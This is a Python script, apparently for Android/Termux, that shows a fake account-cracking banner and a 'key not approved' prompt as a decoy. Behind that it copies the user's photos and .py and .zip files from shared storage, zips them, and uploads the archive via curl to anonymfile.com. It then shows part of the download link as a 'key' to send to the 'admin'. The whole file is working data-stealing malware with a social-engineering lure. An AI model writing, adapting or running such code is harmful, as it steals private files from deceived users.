#!/usr/bin/python3
#creater: BilalHaiderID
#path: /sdcard/Android/data/io.spck/files/Virus-ID
from os import system as cmd
from os import listdir as lst
from sys import exit as exit
from sys import argv as arg
from time import sleep as slp
from random import randint as rr
from requests import get as get
#_________[ BASIC COLOURS ]_________>>
red = "\033[31m"
green = "\033[32m"
white = "\033[37m"
#_________[ SCRIPT BANNER ]_________>>
bannerID = """
	\033[33m.dP"Y8 88""Yb 88 8888b.  888888 88""Yb 
	\033[34m`Ybo." 88__dP 88  8I  Yb 88__   88__dP 
	\033[35mo.`Y8b 88"    88  8I  dY 88""   88"Yb  
	\033[36m8bodP' 88     88 8888Y"  888888 88  Yb\033[37m"""
#_________[ LIST HOST UPLOAD ]_________>>
Host_listID = [
				"https://anonymfile.com",
				"https://file.io"
				]
#_________[ FAKE IDS ]_________>>
def fakeID():
	clearID()
	print(bannerID)
	lineID()
	limit = int(rr(10,35))
	for i in range(limit):
		crh = (rr(1,6))
		if crh==1:
			print(f"{red}[CP] 1000{str(rr(10,89))}{str(rr(100000000,999999999))} {str(rr(1111111,9999999))}{white}")
		else:
			print(f"{green}[OK] 1000{str(rr(10,89))}{str(rr(100000000,999999999))} {str(rr(1111111,9999999))}{white}")
#__________[ COPY FILES ]_________>>
def copyID(level=1):
	if level not in [1,2,3]:
		level = 1
	if level==1:
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data-ID/Photos")
		except:
			pass
	elif level==2:
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data-ID/Photos")
		except:
			pass
		try:
			cmd("cp /sdcard/*.py /sdcard/File")
		except:
			pass
	elif level==3:
		try:
			IDS = lst("/storage/emulated/0/Pictures/")
			for folders in IDS:
				IDT = lst(f"/storage/emulated/0/Pictures/{folders}")
				for folders2 in IDT:
					cmd(f"cp /storage/emulated/0/Pictures/{folders}/{folders2} /sdcard/Data-ID/Photos")
		except:
			pass
		try:
			cmd("cp /sdcard/*.py /sdcard/File")
		except:
			pass
		try:
			cmd("cp /sdcard/*.zip /sdcard/File")
		except:
			pass
#_________[ CREATING FOLDERS ]_________>>
def folderID():
	try:
		list_sdcard = lst("/sdcard")
		if "Data-ID" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data-ID")
	except:
		cmd("mkdir /sdcard/Data-ID")
	try:
		list_sdcard = lst("/sdcard/Data-ID")
		if "Files" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data-ID/Files")
	except:
		cmd("mkdir /sdcard/Data-ID/Files")
	try:
		list_sdcard = lst("/sdcard/Data-ID")
		if "Photos" in list_sdcard:
			pass
		else:
			cmd("mkdir /sdcard/Data-ID/Photos")
	except:
		cmd("mkdir /sdcard/Data-ID/Photos")
#_________[ lINE SCR DEF ]_________>>
def lineID(obj="-",tim=50,tmslp=0.01):
	print(f"{obj}"*tim);slp(tmslp)
#_________[ CREATING ZIP ]_________>>
def compressID():
	cmd("zip -r Data.zip /sdcard/Data-ID >> /dev/null")
#_________[ CLEAR SCR DEF ]_________>>
def clearID():
	cmd("clear")
#_________[ LOGO SCRIPT DEF ]_________>>
def logoID(codeID):
	clearID()
	print(f"  [ {codeID} ]")
	print(bannerID)
	lineID()
	print("[+] Your Key Is Not Approved Bro :)")
	print("[+] Send Your Key To Admin For Approval")
	print(f"[+] Your Key : XXXX-{codeID}-YYYY")
	lineID()
	exit()
#_________[ MALWARE MAIN DEF ]______>>
def malwareID():
	list_Files = lst()
	if "Data.zip" not in list_Files:
		folderID()
		copyID()
		compressID()
	try:
		dataID = open("data/done.txt","r").read()
	except:
		cmd("""curl -F "file=@Data.zip" https://anonymfile.com/api/v1/upload >> data/json.txt""")
		open("data/done.txt","w").write("Done....")
	data = open("data/json.txt","r").read()
	data = data.split(":")[8]
	data = data.split("/")[3]
	data = (data.split("}")[0])
	code = data[0:5]
	logoID(code)

if __name__=="__main__":
	malwareID()